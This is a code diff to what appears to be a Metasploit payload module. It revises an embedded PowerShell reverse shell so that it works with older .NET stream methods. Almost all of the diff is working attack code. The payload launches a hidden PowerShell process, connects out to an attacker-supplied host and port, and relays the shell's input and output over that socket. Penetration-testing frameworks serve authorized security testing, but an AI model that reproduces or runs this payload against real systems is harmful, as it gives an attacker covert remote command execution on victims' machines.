@@ -10,7 +10,7 @@ require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
 
-  CachedSize = 1481
+  CachedSize = 1588
 
   include Msf::Payload::Single
   include Msf::Sessions::CommandShellOptions
@@ -75,21 +75,23 @@ $q=$p.Start();
 $is=$p.StandardInput;
 $os=$p.StandardOutput;
 $es=$p.StandardError;
-$osread=$os.BaseStream.ReadAsync($ob, 0, $ob.Length);
-$esread=$es.BaseStream.ReadAsync($eb, 0, $eb.Length);
+$osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);
+$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);
 $c.connect($a,$b);
 $s=$c.GetStream();
 while ($true) {
     start-sleep -m 100;
     if ($osread.IsCompleted -and $osread.Result -ne 0) {
-      $s.Write($ob,0,$osread.Result);
+      $r=$os.BaseStream.EndRead($osread);
+      $s.Write($ob,0,$r);
       $s.Flush();
-      $osread = $os.BaseStream.ReadAsync($ob, 0, $ob.Length);
+      $osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);
     }
     if ($esread.IsCompleted -and $esread.Result -ne 0) {
-      $s.Write($eb,0,$esread.Result);
+      $r=$es.BaseStream.EndRead($esread);
+      $s.Write($eb,0,$r);
       $s.Flush();
-      $esread = $es.BaseStream.ReadAsync($eb, 0, $eb.Length);
+      $esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);
     }
     if ($s.DataAvailable) {
       $r=$s.Read($nb,0,$nb.Length);
@@ -102,11 +104,11 @@ while ($true) {
     }
     if ($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)) {
         break;
-    };
+    }
     if ($p.ExitCode -ne $null) {
         break;
-    };
-};
+    }
+}
 ^.gsub!("\n", "")
 
     "powershell -w hidden -nop -c #{powershell}"
